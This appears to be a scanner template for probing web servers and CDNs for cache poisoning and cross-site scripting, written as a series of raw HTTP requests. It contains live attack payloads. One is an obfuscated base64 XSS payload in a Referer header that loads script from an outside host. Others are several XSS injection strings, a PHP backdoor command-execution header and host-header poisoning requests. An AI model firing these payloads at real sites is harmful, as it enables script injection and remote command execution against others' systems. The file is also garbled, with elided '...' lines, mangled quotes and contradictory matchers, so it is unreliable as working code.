id: xss-cache-all

info:
  name: xss poisoning cdn
  author: ibrahimhaxor
  severity: critical
  description: Basic host header poisoning vulnerability check. Checks for reflections of X-Forwarded-Host and X-Host in the response body.

requests:
  - raw:
      - |
        GET /?test HTTP/2
        Host: {{Hostname}}
        X-Amz-Server-Side-Encryption: AES256xss
      - |
        GET /?xxx HTTP/2
        Host: {{Hostname}}
        X-Forwarded-Scheme: http 
        ...
      - |
        GET /xx/xxx/xxx/xxx/?test HTTP/1.1
        Host: {{Hostname}}
        
      - |
        GET /xxxx/xxxx/xxx HTTP/2
        Host: {{Hostname}}
        Referer: ?</script><svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=>
...
      - |
        GET /xxx/xx/xxx.xx/x.js?t=2021111121 HTTP/2 
        Host: {{Hostname}}
        X-Forwarded-For: xss
        X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
        X-Forwarded-For: >
        Cookie: gdId=xss</script%20
        
      - |
        GET /ydvjsmghre?cb515519=1 HTTP/1.1
        Host: {{Hostname}}
        zzzheadertest: test2␇test2
      - |
        GET /ginfcgcart?cb667043=1 HTTP/1.1
        zzzheadertest: 
        Host: {{Hostname}}
      - |
        GET /myapps/;"onmouseover='rSq7(95072)'bad=" HTTP/1.1
        Host: {{Hostname}}
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agentt: zerodiumsystem(“id”);
      - |
        GET /?duplicate-host-headers-line-wrap HTTP/1.1
         Host: xrcr0x4a.com
        Host: {{Hostname}}
      - |
        GET https://{{Hostname}}/?absolute-url HTTP/1.1
        Host: xrcr0x4a.com

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "xrcr0x4a"
          - "Server-Timing: cdn-cache; desc=HIT"
          - "x-amz-server-side-encryption"
          - "invalidArgument"
          - "Cf-Cache-Status: HIT"
          - "Moved Permanently"
          - "X-Amz-Cf-Pop"
          - "Age"
          - "Bad Message 400"
          - "...
<html>
...
<script>
...
"Referer":"?</script>
<svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=>
..."
          - "...
guid="</script ","24.99.19.20","xss","xss><svg/onload=globalThis[`al`+/ert/.source]`1`//,">
..."
          - "HTTP/1.1 400 Bad Request"
          - "xrcr0x4a.com"
          - "onmouseover='rSq7(95072)'bad="
          - "uid"
          - "php/8.1.0-dev"
        part: body
        condition: and
      - type: status
        status:
          - 200
